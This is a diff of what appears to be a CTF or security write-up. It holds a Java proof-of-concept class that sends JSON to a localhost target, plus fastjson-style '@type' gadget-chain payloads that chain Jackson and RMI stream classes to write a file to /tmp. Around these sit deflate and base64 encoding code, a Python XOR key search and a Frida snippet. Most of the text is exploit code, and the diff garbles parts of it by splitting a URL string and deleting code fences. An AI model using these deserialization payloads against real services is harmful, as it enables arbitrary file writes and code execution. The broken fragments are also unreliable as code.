@@ -89,7 +89,8 @@ import java.util.zip.DeflaterOutputStream;
 import java.util.zip.InflaterInputStream;
 
 publicclass POC {
-    static String target = "http://localhost:8080/";
+    static String target = "http://localhost:
+8080/";
 
     public static Object sendJson(String payload) {
         try {
@@ -185,23 +186,8 @@ UTF8JsonGenerator
 JsonGenerator
 JsonGenerationException
 Exception
-```
-
-
-
-```
 {"a":"{"@type":"java.lang.Exception","@type":"com.fasterxml.jackson.core.JsonGenerationException","g":{}}","b":{"$ref":"$.a.a"},"c":"{"@type":"com.fasterxml.jackson.core.JsonGenerator","@type":"com.fasterxml.jackson.core.json.UTF8JsonGenerator","out":{}}","d":{"$ref":"$.c.c"}}
-```
-
-
-
-```
 {"@type":"java.io.OutputStream","@type":"sun.rmi.server.MarshalOutputStream","out":{"@type":"java.util.zip.InflaterOutputStream","out":{"@type":"com.app.FilterFileOutputStream","name":"/tmp/1234","prefix":"/"},"infl":{"input":{"array":"eJzT0jdU0IJC/aTMPP2kxOIMBd1kBXUII1PBTk1BPyW1TL8kuUDfQs/QxEzPyMAUiI30LSwsLRUM7NQM1QFanhCv","limit":${length}}},"bufLen":"100"},"protocolVersion":1}
-```
-
-
-
-```
 String input = "123123123123";
 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
 try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byteArrayOutputStream)) {
@@ -210,11 +196,6 @@ try (DeflaterOutputStream deflaterOutputStream = new DeflaterOutputStream(byt
 String encoded = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
 int leng = byteArrayOutputStream.toByteArray().length;
 System.out.println(encoded);
-```
-
-
-
-```
 import javassist.CannotCompileException;
 import javassist.ClassPool;
 import javassist.CtClass;
@@ -237,7 +218,8 @@ import java.util.zip.DeflaterOutputStream;
 import java.util.zip.InflaterInputStream;
 
 publicclass POC {
-    static String target = "http://localhost:8080/";
+    static String target = "http://localhost:
+8080/";
 
     public static Object sendJson(String payload) {
         try {
@@ -280,11 +262,6 @@ publicclass POC {
         System.out.println(payload2);
 
     }
-```
-
-
-
-```
 {
   "a": "{    "@type": "java.lang.Exception",    "@type": "com.fasterxml.jackson.core.JsonGenerationException",    "g": {    }  }",
   "b": {
@@ -295,11 +272,6 @@ publicclass POC {
     "$ref": "$.c.c"
   }
 }
-```
-
-
-
-```
 {
   "@type": "java.io.OutputStream",
 "@type": "sun.rmi.server.MarshalOutputStream",
@@ -320,11 +292,6 @@ publicclass POC {
   },
 "protocolVersion": 1
 }
-```
-
-
-
-```
 bytes_array = [
   0x90, 0xFB, 0xF1, 0x17, 0x89, 0x89, 0x89, 0xF5, 0x86, 0x7D, 
   0xF5, 0xB6, 0x73, 0xB5
@@ -338,11 +305,6 @@ if (48 <= xor_char <= 57) or (97 <= xor_char <= 122) or (xor_char == 9
     print(f"找到的异或字符: '{chr(xor_char)}'")
 else:
     print("没有找到符合条件的异或字符。")
-```
-
-
-
-```
 function getModuleBaseAddress(moduleName) {
     return Process.getModuleByName(moduleName).base;
 }
